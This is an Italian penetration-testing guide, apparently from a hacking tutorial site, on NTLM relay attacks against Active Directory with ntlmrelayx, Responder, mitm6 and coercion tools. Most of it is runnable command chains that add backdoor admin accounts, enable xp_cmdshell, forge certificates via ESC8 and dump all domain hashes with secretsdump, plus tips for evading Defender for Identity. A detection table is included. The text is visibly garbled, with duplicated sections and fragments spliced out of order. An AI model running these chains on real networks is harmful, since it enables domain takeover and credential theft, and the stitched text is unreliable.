impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
'EvilPass123!'

# RBCD automatico — --delegate-access crea computer + configura delega

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support --delegate-access

# Shadow Credentials — inietta chiave in msDS-KeyCredentialLink

sudo ntlmrelayx.py -t ldaps\://10.10.10.5 -smb2support \
\--shadow-credentials --shadow-target 'WS01

***

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```
LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS
```

| Cosa puoi fare              | Requisito                        |
| --------------------------- | -------------------------------- |
| Tutto ciò che LDAP permette | +                                |
| Shadow Credentials          | Write su msDS-KeyCredentialLink  |
| Add computer account        | MachineAccountQuota > 0          |
| RBCD completo               | Write sul computer object target |

***

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```
HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato
```

| Target HTTP                        | Vettore                             |
| ---------------------------------- | ----------------------------------- |
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS                       | Accesso mailbox, lateral movement   |
| OWA (Outlook Web App)              | Accesso email                       |
| IIS con NTLM auth                  | Accesso app                         |
| WPAD                               | Cattura hash durante browsing       |

***

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```
MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp_cmdshell → RCE
```

| Cosa puoi fare      | Requisito                 |
| ------------------- | ------------------------- |
| Login al database   | Windows Auth abilitata    |
| Query dati          | Permessi SELECT           |
| `xp_cmdshell` → RCE | sysadmin role             |
| Lettura file server | `BULK INSERT`, OPENROWSET |

***

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```
IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo
```

***

## Decision tree — cosa usi in base a cosa trovi

```
HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap://DC_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps://DC_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp_cmdshell
│           → ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
    └── mitm6 → LDAPS relay → RBCD → getST → DA
```

***

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
```

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

La coercizione forza un host specifico (anche il DC) ad autenticarsi verso di te senza aspettare. Richiede credenziali low-privilege di dominio.

### PrinterBug / SpoolSample (MS-RPRN)

Abusa il Print Spooler. Il target torna verso l'attaccante con il proprio machine account. Richiede Print Spooler attivo.

```bash
python3 printerbug.py corp.local/user:Password123@10.10.10.5 10.10.14.1
# 10.10.10.5 = host da coercere (es. DC)
# 10.10.14.1 = IP attaccante

# Verifica se Print Spooler è attivo
nxc smb 10.10.10.5 -u user -p pass -M spooler
```

### PetitPotam (MS-EFSR)

Abusa EFS (Encrypting File System). La versione **autenticata** funziona anche post-patch.

```bash
# Autenticata (funziona post-CVE-2022-26925)
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Unauthenticated (solo sistemi non patchati)
python3 PetitPotam.py 10.10.14.1 10.10.10.5

# WebDAV variant — esce via HTTP invece di SMB (bypassa SMB signing!)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test 10.10.10.5
```

### DFSCoerce (MS-DFSNM)

Non patchato — funziona su sistemi aggiornati.

```bash
python3 dfscoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### ShadowCoerce (MS-FSRVP)

```bash
python3 shadowcoerce.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5
```

### Coercer — aggrega tutti i metodi

[Coercer](https://github.com/p0dalirius/Coercer) testa automaticamente 12+ metodi e usa quello che funziona.

```bash
pip3 install coercer

# Scan — verifica senza coercere
python3 Coercer.py scan -t 10.10.10.5 -u user -p Password123 -d corp.local -v

# Coerce con tutti i metodi
python3 Coercer.py coerce -t 10.10.10.5 -l 10.10.14.1 \
  -u user -p Password123 -d corp.local --always-continue
```

### WebDAV coercion — bypassa SMB signing

Se WebClient è attivo, la coercizione esce via HTTP (porta 80) invece di SMB. HTTP non ha signing → puoi relayarla anche quando SMB signing è richiesto ovunque.

```bash
# Verifica WebClient
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# ntlmrelayx ascolta su HTTP
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access --http-port 80 -smb2support

# Coercione verso HTTP (WebDAV)
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER@80/test WS01_IP
```

***

## Opzioni globali ntlmrelayx

| Opzione            | Descrizione                                            |
| ------------------ | ------------------------------------------------------ |
| `-t TARGET`        | Target singolo                                         |
| `-tf FILE`         | File con lista target                                  |
| `-smb2support`     | **Sempre mettilo** — abilita SMB2                      |
| `-6`               | Supporto IPv6 (per mitm6)                              |
| `-i`               | Shell interattiva → accessibile via nc                 |
| `-socks`           | Mantieni sessione aperta per proxychains               |
| `-c COMANDO`       | Esegui comando su relay SMB                            |
| `-e FILE`          | Carica ed esegui file sul target                       |
| `--remove-mic`     | Rimuovi MIC (CVE-2019-1040) — per cross-protocol relay |
| `--no-dump`        | Non fare SAM dump automatico                           |
| `--no-da`          | Non tentare aggiunta a Domain Admins                   |
| `--no-acl`         | Non modificare ACL                                     |
| `-w`               | Monitora file target per aggiornamenti live            |
| `--http-port PORT` | Porta HTTP listener                                    |
| `--no-http-server` | Disabilita HTTP server                                 |
| `--no-smb-server`  | Disabilita SMB server                                  |

***

## Scenario 1 — SMB Relay → SAM dump + exec

```bash
# SAM dump automatico su tutti i target
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support

# Con exec
sudo ntlmrelayx.py -t smb://10.10.10.20 -smb2support \
  -c "net user attacker Pass123! /add && net localgroup Administrators attacker /add"

# Interactive shell
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i
# → nc 127.0.0.1 11000
```

### Cosa fare con gli hash SAM

```bash
nxc smb 10.10.10.0/24 -u Administrator -H NThash --local-auth
impacket-secretsdump corp.local/administrator:pass@10.10.10.20
```

***

## Scenario 2 — SOCKS mode → accesso persistente

```bash
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks

# Lista sessioni attive
ntlmrelayx> socks

# Via proxychains — usa qualsiasi tool come se fossi autenticato
echo "socks4 127.0.0.1 1080" >> /etc/proxychains4.conf
proxychains -q impacket-secretsdump -no-pass CORP/admin@TARGET
proxychains -q nxc smb TARGET -u admin -p '' --no-bruteforce
```

***

## Scenario 3 — LDAP Relay → RBCD → Domain Admin

```bash
# Step 1 — relay LDAPS con --delegate-access
sudo ntlmrelayx.py -t ldaps://10.10.10.5 --delegate-access -smb2support -6

# Step 2 — mitm6 o coercizione per far autenticare WS01$
sudo mitm6 -d corp.local -i eth0
# Quando WS01$ autentica:
# [*] Adding new computer: XEWRIYIH$ with password: Rand0mP@ss!
# [*] Delegating to WS01$ via msDS-AllowedToActOnBehalfOfOtherIdentity

# Step 3 — getST e accesso come Administrator
impacket-getST -spn cifs/WS01.corp.local -impersonate Administrator \
  -dc-ip 10.10.10.5 corp.local/'XEWRIYIH$':'Rand0mP@ss!'
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
```

Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).

***

## Scenario 4 — LDAPS Relay → Shadow Credentials

Più stealth di RBCD — non crea computer account.

```bash
sudo ntlmrelayx.py -t ldaps://10.10.10.5 \
  --shadow-credentials --shadow-target 'WS01$' \
  --pfx-password 'CertPass123' --export-type PEM \
  --cert-outfile-path /tmp/ws01_shadow -smb2support

# Usa il certificato
python3 gettgtpkinit.py -cert-pfx /tmp/ws01_shadow.pfx -pfx-pass 'CertPass123' \
  corp.local/'WS01$' /tmp/ws01.ccache
KRB5CCNAME=/tmp/ws01.ccache python3 getnthash.py -key AS_REP_KEY corp.local/'WS01$'
nxc smb WS01.corp.local -u 'WS01$' -H NThash
```

Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).

***

## Scenario 5 — LDAP Relay → Dump LAPS / gMSA / ADCS info

```bash
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-laps
# Hostname        | AdmPwd
# WS01.corp.local | R@nd0mL@ps!

sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-gmsa
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --dump-adcs   # template ESC info
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --add-computer 'EVIL$' 'EvilPass123!'
```

***

## Scenario 6 — HTTP Relay → ESC8 (AD CS) → DCSync

Questo scenario non dipende da SMB signing o LDAP signing — HTTP non ha signing, funziona sempre se EPA non è attivo sul CA.

```bash
# Step 1 — Verifica
curl -I http://CA_IP/certsrv/
# WWW-Authenticate: NTLM → vulnerabile

# Step 2 — ntlmrelayx verso Web Enrollment
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support

# Step 3 — Coerci il DC verso l'attaccante
python3 PetitPotam.py -u user -p Password123 -d corp.local 10.10.14.1 10.10.10.5

# Quando arriva autenticazione DC01$:
# [*] Certificate successfully requested
# [*] Base64 certificate of user DC01$: MIIRLAIBAz...

# Step 4 — Autenticati come DC01$ e DCSync
certipy auth -pfx dc01.pfx -dc-ip 10.10.10.5
# → NT hash di DC01$

KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
  -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
```

Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).

***

## Scenario 7 — MSSQL Relay → xp\_cmdshell

```bash
sudo ntlmrelayx.py -t mssql://10.10.10.30 -smb2support -socks
proxychains -q impacket-mssqlclient -no-pass -windows-auth corp.local/admin@10.10.10.30

SQL> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
SQL> EXEC xp_cmdshell 'whoami';
```

Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).

***

## Scenario 8 — Cross-protocol relay con `--remove-mic`

Quando SMB signing è richiesto ma LDAP signing non lo è, usi `--remove-mic` per strippare il MIC dall'autenticazione NTLM e relayarla cross-protocol.

```bash
# SMB → LDAP (rimuove MIC per aggirare protezione cross-protocol)
sudo ntlmrelayx.py -t ldap://10.10.10.5 -smb2support --remove-mic

# SMB → LDAPS
sudo ntlmrelayx.py -t ldaps://10.10.10.5 -smb2support --remove-mic

# Utile anche con NTLMv1 (che non ha MIC nativamente)
```

***

## Scenario 9 — Multi-relay (-tf)

```bash
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -w
# Un'unica autenticazione → relay contemporaneo su TUTTI i target
# -w aggiorna la lista live
```

***

## Limitazioni e workaround

| Protezione                      | Cosa blocca                | Workaround                                   |
| ------------------------------- | -------------------------- | -------------------------------------------- |
| SMB signing richiesto           | SMB relay                  | Relay su LDAP/HTTP/MSSQL; WebDAV coercion    |
| LDAP signing richiesto          | LDAP write relay           | Usa LDAPS; `--remove-mic` cross-protocol     |
| LDAPS Channel Binding (CBT)     | LDAPS relay                | HTTP/ADCS relay; molto difficile da aggirare |
| EPA su AD CS                    | ESC8 relay                 | Non aggirabile se configurato correttamente  |
| LLMNR/NBT-NS disabilitato       | Responder passivo          | mitm6 + coercizione attiva                   |
| PetitPotam patchato (anon)      | EFS coercion anonima       | Versione autenticata; PrinterBug; DFSCoerce  |
| Print Spooler disabilitato      | PrinterBug                 | DFSCoerce; PetitPotam autenticato; Coercer   |
| Microsoft Defender for Identity | Rileva relay + coercizione | Riduci velocità; usa sessioni esistenti      |

***

## Detection

| Tecnica                       | Event ID            | Indicatore                                                   |
| ----------------------------- | ------------------- | ------------------------------------------------------------ |
| LLMNR poisoning               | 4648                | Logon esplicito verso IP insolito                            |
| Relay SMB                     | 4624 Type 3         | Login di rete da IP attaccante                               |
| Relay LDAP                    | 4662                | Modifica msDS-AllowedToActOnBehalfOf, msDS-KeyCredentialLink |
| PetitPotam / PrinterBug       | 4769                | Machine account autentica verso IP non DC                    |
| ESC8                          | 4886                | Richiesta cert per account macchina ($) da IP insolito       |
| Shadow Credentials            | 4662                | Modifica msDS-KeyCredentialLink                              |
| RBCD                          | 4662                | Modifica msDS-AllowedToActOnBehalfOfOtherIdentity            |
| Cross-protocol (--remove-mic) | 4624 + correlazione | NTLM senza MIC su ambienti moderni                           |

***

## Workflow completo — da rete interna a Domain Admin

```
FASE 1 — RECON
├── nxc smb subnet --gen-relay-list relay.txt   → trova target SMB unsigned
├── nxc ldap DC -u user -p pass -M ldap-checker → verifica LDAP signing
├── curl -I http://CA_IP/certsrv/               → verifica ESC8
└── nxc smb subnet -M webdav                    → verifica WebDAV

FASE 2 — DECISION TREE
├── SMB signing OFF → SMB relay (più semplice)
├── LDAP signing OFF → LDAP/LDAPS relay (AD manipulation)
├── ESC8 → HTTP relay verso ADCS (più devastante)
└── Niente → mitm6 + WebDAV coercion

FASE 3 — SETUP (3 terminal paralleli)
├── T1: ntlmrelayx con target e azioni
├── T2: Responder (HTTP/SMB off) OPPURE mitm6
└── T3: coercizione attiva (PrinterBug/PetitPotam/DFSCoerce)

FASE 4 — IMPATTO
├── SMB relay → SAM dump → PtH laterale
├── LDAPS relay → RBCD/Shadow Creds → getST → DA
├── ESC8 → certificato DC$ → secretsdump → tutti gli hash
└── MSSQL → xp_cmdshell → shell

FASE 5 — PERSISTENZA
└── Hash krbtgt → Golden Ticket → /articoli/golden-ticket
```

***

## Cheat Sheet completo

```bash
# === RECON ===
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay.txt
nxc ldap DC -u user -p pass -M ldap-checker
nxc smb subnet -u user -p pass -M webdav
curl -I http://CA_IP/certsrv/

# === SETUP RESPONDER ===
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf
sudo responder -I eth0 -rdwv

# === COERCIZIONE ===
python3 printerbug.py corp.local/user:pass@DC_IP ATTACKER_IP
python3 PetitPotam.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 dfscoerce.py -u user -p pass -d corp.local ATTACKER_IP DC_IP
python3 Coercer.py coerce -t DC_IP -l ATTACKER_IP -u user -p pass -d corp.local

# === SMB RELAY ===
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support
sudo ntlmrelayx.py -t smb://TARGET -smb2support -c "whoami"
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -i   # → nc 127.0.0.1 11000
sudo ntlmrelayx.py -tf /tmp/relay.txt -smb2support -socks
proxychains impacket-secretsdump -no-pass CORP/admin@TARGET

# === LDAP/LDAPS RELAY ===
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support              # dump + auto
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support             # write complete
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --remove-mic # cross-protocol
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support --delegate-access -6  # RBCD
sudo ntlmrelayx.py -t ldaps://DC_IP -smb2support \
  --shadow-credentials --shadow-target 'HOST$'               # Shadow Creds
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-laps
sudo ntlmrelayx.py -t ldap://DC_IP -smb2support --dump-gmsa

# === ESC8 ===
sudo ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support
certipy auth -pfx dc01.pfx -dc-ip DC_IP
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/'DC01$'@DC_IP

# === MSSQL ===
sudo ntlmrelayx.py -t mssql://SQL_IP -smb2support -socks
proxychains impacket-mssqlclient -no-pass -windows-auth corp.local/admin@SQL_IP

# === IPv6 (mitm6) ===
sudo mitm6 -d corp.local -i eth0
sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support

# === RBCD CHAIN COMPLETA ===
# 1. ntlmrelayx --delegate-access → XEWRIYIH$ con password
# 2. impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
#      -dc-ip DC_IP corp.local/'XEWRIYIH$':'pass'
# 3. export KRB5CCNAME=Administrator.ccache
# 4. impacket-secretsdump -k -no-pass -just-dc corp.local/Administrator@DC_IP
```

**Articoli correlati:**

* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [DCSync](https://hackita.it/articoli/dcsync/)
* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)

> Uso esclusivo in ambienti autorizzati.

\#impacket #ntlm-relay #active-directory #windows
\
\--pfx-password 'CertPass123' --cert-outfile-path /tmp/ws01

# Cross-protocol — SMB in → LDAP out (rimuove MIC)

sudo ntlmrelayx.py -t ldap\://10.10.10.5 -smb2support --remove-mic

# Interactive LDAP shell — comandi diretti su AD

sudo ntlmrelayx.py -t ldap\://10.10.10.5 -smb2support -i
nc 127.0.0.1 11389   # → add\_user / add\_user\_to\_group / dump\_domain ...

```

---

### LDAPS (`ldaps://`)

**Perché funziona:** LDAPS è LDAP over TLS. Non ha lo stesso problema di signing — la cifratura TLS del canale non è legata crittograficamente all'autenticazione NTLM (salvo Channel Binding / CBT attivo). Permette tutte le operazioni write che LDAP con signing blocca.

**Perché fallisce:** LDAP Channel Binding (CBT) tying lega l'autenticazione NTLM al certificato TLS del server — il relay viene rigettato perché l'attaccante non ha il certificato del DC. Abilitato su DC moderni con patch recenti.

```

LDAPS senza CBT → relay funziona + write complete → RBCD, Shadow Creds, user creation
LDAPS con CBT   → relay rigettato → usa HTTP/ADCS

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Tutto ciò che LDAP permette | + |
| Shadow Credentials | Write su msDS-KeyCredentialLink |
| Add computer account | MachineAccountQuota > 0 |
| RBCD completo | Write sul computer object target |

---

### HTTP / HTTPS (`http://` / `https://`)

**Perché funziona:** HTTP non supporta message signing — non esiste un meccanismo equivalente a SMB signing o LDAP signing. Questo significa che **qualsiasi** autenticazione NTLM su HTTP può essere relayata, indipendentemente dalla configurazione del dominio. È per questo che ESC8 è così devastante: il Web Enrollment di AD CS accetta NTLM su HTTP per default.

**Perché fallisce:** EPA (Extended Protection for Authentication) su HTTPS lega il token NTLM al canale TLS — il relay viene rigettato. Se il CA ha EPA abilitato, ESC8 non funziona.

```

HTTP senza EPA  → relay SEMPRE possibile → ADCS, Exchange, OWA, web app
HTTP con EPA    → relay rigettato

```

| Target HTTP | Vettore |
|-------------|---------|
| AD CS Web Enrollment (`/certsrv/`) | ESC8 → certificato per DC$ → DCSync |
| Exchange EWS | Accesso mailbox, lateral movement |
| OWA (Outlook Web App) | Accesso email |
| IIS con NTLM auth | Accesso app |
| WPAD | Cattura hash durante browsing |

---

### MSSQL (`mssql://`)

**Perché funziona:** SQL Server supporta Windows Authentication via NTLM come metodo legacy. Non ha signing equivalente a SMB. Un relay NTLM verso SQL Server viene accettato come autenticazione Windows legittima.

**Perché fallisce:** se SQL Server usa solo SQL Authentication (non Windows Auth), il relay NTLM non ha senso. Se l'account relayed non ha permessi sul DB, ottieni accesso limitato.

```

MSSQL con Windows Auth → relay funziona → login SQL
Account relayed = sysadmin → xp\_cmdshell → RCE

```

| Cosa puoi fare | Requisito |
|----------------|-----------|
| Login al database | Windows Auth abilitata |
| Query dati | Permessi SELECT |
| `xp_cmdshell` → RCE | sysadmin role |
| Lettura file server | `BULK INSERT`, OPENROWSET |

---

### IMAP / SMTP

Meno usati in scenari AD puri, ma rilevanti in ambienti Exchange on-premise.

```

IMAP relay → accesso mailbox → lettura email, esfiltrazione dati
SMTP relay → invio email → phishing interno da account legittimo

```

---

## Decision tree — cosa usi in base a cosa trovi

```

HAI UN'AUTENTICAZIONE NTLM (da Responder/coercizione)?
│
├── Target ha SMB signing OFF?
│   └── SÌ → SMB relay → SAM dump, exec, file access
│           → ntlmrelayx.py -tf relay.txt -smb2support
│
├── Target ha LDAP signing OFF?
│   └── SÌ (write) → LDAP relay → RBCD, dump, user creation
│           → ntlmrelayx.py -t ldap\://DC\_IP -smb2support
│       └── LDAPS senza CBT → ancora meglio → Shadow Credentials + RBCD
│               → ntlmrelayx.py -t ldaps\://DC\_IP -smb2support
│
├── AD CS Web Enrollment esposto (ESC8)?
│   └── SÌ → HTTP relay → certificato DC$ → DCSync completo
│           → ntlmrelayx.py -t http\://CA\_IP/certsrv/certfnsh.asp --adcs --template DomainController -smb2support
│
├── SQL Server con Windows Auth?
│   └── SÌ → MSSQL relay → login → se sysadmin → xp\_cmdshell
│           → ntlmrelayx.py -t mssql://SQL\_IP -smb2support -socks
│
├── Exchange / OWA esposto?
│   └── SÌ → HTTP relay → accesso mailbox
│
├── Nulla funziona con questa autenticazione?
│   └── Cambia vittima della coercizione
│       → Coerci un account con più privilegi (machine account, service account)
│       → WebDAV coercion per bypassare SMB signing
│       → --remove-mic per cross-protocol relay
│
└── SMB signing ovunque + LDAP signing + no ADCS?
└── mitm6 → LDAPS relay → RBCD → getST → DA

````

---

## Step 0 — Verifica prima di tutto

```bash
# SMB signing — genera target list direttamente
nxc smb 10.10.10.0/24 --gen-relay-list /tmp/relay_targets.txt
# "signing:False" → relay target

# Verifica LDAP signing sul DC
nxc ldap 10.10.10.5 -u user -p pass -M ldap-checker
# "LDAP Signing: NOT required" → relay LDAP possibile

# Verifica ESC8 (Web Enrollment senza EPA)
curl -I http://CA_IP/certsrv/
# "WWW-Authenticate: NTLM" → ESC8 vulnerabile

# Verifica WebClient (WebDAV) sulle workstation
nxc smb 10.10.10.0/24 -u user -p pass -M webdav

# Verifica MachineAccountQuota (per RBCD)
nxc ldap 10.10.10.5 -u user -p pass -M maq
````

***

## Step 1 — Cattura l'autenticazione NTLM

### Responder — LLMNR/NBT-NS poisoning (passivo)

[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.

```bash
# Configura Responder
sed -i 's/HTTP = On/HTTP = Off/g' /etc/responder/Responder.conf
sed -i 's/SMB = On/SMB = Off/g' /etc/responder/Responder.conf

# Lancia in poisoning mode
sudo responder -I eth0 -rdwv

# Solo ascolto (recon senza poisoning)
sudo responder -I eth0 -A
```

### mitm6 — DHCPv6 poisoning

Windows preferisce IPv6 su IPv4. mitm6 risponde alle richieste DHCPv6 dichiarandosi DNS server IPv6 e avvelena le risoluzioni. Funziona anche con LLMNR disabilitato.

```bash
pip3 install mitm6
sudo mitm6 -d corp.local -i eth0

# ntlmrelayx deve girare con -6
sudo ntlmrelayx.py -6 -t ldaps://10.10.10.5 --delegate-access -smb2support
```

> mitm6 non è immediato: Windows rinnova DHCP al reboot o a eventi di rete. Aspetta 5–30 minuti.

***

## Step 2 — Tecniche di coercizione (autenticazione forzata)

